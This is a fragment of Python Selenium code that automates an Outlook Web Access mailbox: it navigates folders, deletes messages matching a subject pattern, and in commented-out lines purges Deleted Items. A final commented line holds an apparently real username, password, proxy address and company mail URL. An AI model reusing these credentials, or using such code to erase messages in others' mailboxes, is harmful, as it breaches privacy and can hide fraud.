            # # while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].text!='Deleted Items':
            # while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].get_attribute('innerHTML').strip() != 'Deleted Items':
            #     try:
            #         # [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.text=='Deleted Items' and x.is_displayed()][0].click()
            #         [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.get_attribute('innerHTML').strip() == 'Deleted Items' and x.is_displayed()][0].click()
            #         time.sleep(5)
            #         rootLogger.info(f'{self.prefix} Moved to Deleted Items')
            #     except:
            #         self.alerts_closer(driver)
            #         pass

            # let_els = None
            # while let_els is None:
            #     try:
            #         let_els = [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]
            #     except:
            #          pass

            # for element in [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]') if x.is_displayed()]:
            #     self.alerts_closer(driver)
            #     try:
            #         # element_text=''.join([x for x in element.text.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])
            #         element_text = ''.join([x for x in element.get_attribute('innerHTML').lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])

            #         attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', element)
            #         if len(re.findall(subj_n,element_text))>0:
            #             element.click()
            #             # [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Delete'][0].click()
            #             [x for x in driver.find_elements_by_class_name('tbLh') if x.get_attribute('innerHTML').strip() == 'Delete'][0].click()
            #             alert = driver.switch_to.alert
            #             alert.accept()
            #             rootLogger.info(f'{self.prefix} Deleted from Deleted Items')
            #     except:
            #         self.alerts_closer(driver)
            #         continue

            if report_flag==True:
                return reports

    def quit(self, driver=None):
        if driver is None:
            if self.driver is not None:
                driver = self.driver
            else:
                raise Exception('No session driver')

        driver.quit()

    def navigateToFolder(self, folder_name, driver=None):
        if driver is None:
            if self.driver is not None:
                driver = self.driver
            else:
                raise Exception('No session driver')

        rootLogger.info(f"{self.prefix} moving to folder:{folder_name}")

        #spnFldrNm - list of all folders, also might contain invisible
        folder_name = " ".join(folder_name.strip().split())

        # just navigate to sent items:
        attempts = 0
        max_attempts = 50
        all_folders = []

        while len(all_folders) < 1 and attempts < max_attempts:
            try:
                all_folders = [x for x in driver.find_elements_by_css_selector("#spnFldrNm") if x.is_displayed()]
            except Exception as e:
                time.sleep(0.25)
                all_folders = []
            finally:
                attempts = attempts + 1

        # search for matches
        found = False
        for folder in all_folders:
            current_folder_name = ' '.join(folder.get_attribute("innerText").strip().split())
            # rootLogger.info(f"{self.prefix} compare folders: [{current_folder_name}] and [{folder_name}]")
            if current_folder_name == folder_name:
                # rootLogger.info(f"{self.prefix} navigateToFolder: found folder:{folder_name}")
                found = True
                folder.click()
                break

        if not found:
            rootLogger.error(f"{self.prefix} navigateToFolder: folder:{folder_name} not found")
            return False
        else:
            time.sleep(1)


        # by breadcrumbs, determine that all necessearly data is loaded
        breadcrumbs = None
        attempts = 0
        max_attempts = 50

        while breadcrumbs is None:
            if attempts < max_attempts:
                try:
                    # css(#divBreadcrumbs #spnFldNm) -> here our current location
                    breadcrumbs = driver.find_element_by_css_selector("#divBreadcrumbs #spnFldNm")
                    bc_name = breadcrumbs.get_attribute("innerText").strip()
                    if bc_name == folder_name:
                        # rootLogger.info(f"{self.prefix} Breadcrubs {bc_name} matched with folder:{folder_name}, stop checking.")
                        break
                    else:
                        rootLogger.info(f"{self.prefix} Breadcrubs {bc_name} not matched with folder:{folder_name}, sleep")
                        breadcrumbs = None
                        time.sleep(0.125)

                except Exception as e:
                    breadcrumbs = None
                    time.sleep(0.25)

                attempts = attempts + 1
            else:
                rootLogger.info(f"{self.prefix} Breadcrubs attempts exceeded for folder:{folder_name}")
                return False

        rootLogger.info(f"{self.prefix} moved to folder:{folder_name}")
        return True

    def removeLetterBySubj(self, subj_n, driver=None):
        if driver is None:
            if self.driver is not None:
                driver = self.driver
            else:
                raise Exception('No session driver')

        # check for divSubject to exist
        max_attempts = 50
        attempts = 0
        div_subj = None
        while div_subj is None:
            if attempts < max_attempts:
                attempts = attempts + 1
            else:
                div_subj = driver.find_element_by_css_selector("#divSubject")

            try:
                div_subj = driver.find_element_by_css_selector("#divSubject")
            except Exception as e:
                time.sleep(0.25)
                # raise e

        try:
            for element in [x for x in driver.find_elements_by_css_selector('#divSubject') if x.is_displayed()]:
                try:
                    # rootLogger.info(f"{self.prefix} letter subject:{element.get_attribute('innerText')}")
                    element_text = ''.join([x for x in element.get_attribute('innerText').lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])
                    # element_text = ''.join([x for x in element.text.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])

                    if len(re.findall(subj_n, element_text)) > 0:
                        rootLogger.info(f"{self.prefix} subj compare:{subj_n} vs {element_text} is matched!")

                        element.click()
                        time.sleep(1)

                        # find delete item. in toolbar:
                        [x for x in driver.find_elements_by_class_name('tbLh') if x.get_attribute('innerText') == 'Delete' and x.is_displayed()][0].click()
                        rootLogger.info(f'{self.prefix} Deleted from folder.')

                        # sometimes it shows alert, then accept it
                        try:
                            alert = driver.switch_to.alert
                            alert.accept()
                        except Exception as e:
                            pass

                        # no reason to scan futher
                        break
                except Exception as e:
                    self.alerts_closer(driver)
                    # rootLogger.error(f"{self.prefix}:{e}" )
        except Exception as e:
            self.alerts_closer(driver)
            # rootLogger.info(f"{self.prefix}:{e}" )

        try:
            self.alerts_closer(driver)
        except:
            pass

        return True

#session=WebMailClass('142.234.157.99',38200).StartSession('irene.forlenza', 'irene', 'https://mail.pintoconstruction.com/owa/auth.owa' ,True)
